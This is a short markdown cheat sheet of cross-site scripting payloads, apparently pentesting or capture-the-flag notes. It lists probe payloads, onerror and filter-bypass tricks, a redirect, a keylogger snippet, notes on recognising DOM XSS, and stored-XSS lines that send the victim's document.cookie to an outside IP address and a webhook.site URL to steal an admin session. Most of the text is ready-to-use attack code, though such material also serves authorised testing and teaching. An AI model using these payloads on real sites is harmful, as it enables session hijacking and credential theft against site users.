**Test html injection first, usually this is a good indicator (JS = you might need to bypass filter)**
```Python
<h1>test</h1>
```
**Payloads**
```html
<script>alert()</script>
```
```html
<script>print()</script>
```
```html
<script>prompt("string")</script>
```
```html
<script>alert(window.origin)</script>
```
```html
 <plaintext>
```
!!! alert "info"
	Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on

**You need to trigger XSS if not executed on page load**
```html
<img src=x onerror="prompt(1)">
```
**Redirect**
```html
<img src=x onerror="window.location.href='<https://example.com>'">
```
**script tag filter**
```html
<img src=x onerror=print()>
```
```html
<scri<script>pt>prompt(1)<scri</scr</script>ipt>
```
**Keylogger**
```html
function logKey(event){console.log(event.key)}
```
```html
 document.addEventListener('keydown', logKey)
```

## DOM XSS
---
### Identify
You have XSS execution, but no http requests are being made. We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end. This is DOM XSS
if we look at the page source by hitting `CTRL+U`, we will notice that our `test` string is nowhere to be found. This is because the JavaScript code is updating the page when we click the `Add` button
We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`:

![](../assets/Pasted%20image%2020250605075243.png)

## Stored
**Steal admin cookie (classic)**
```html
<script>fetch("<http://192.168.187.130:9999/>" + document.cookie)</script>
```
```html
<script>var i = new Image; i.src="https://webhook.site/9b3374bf-b997-4021-a302-de75a26fd841/?"+document.cookie;</script>
```
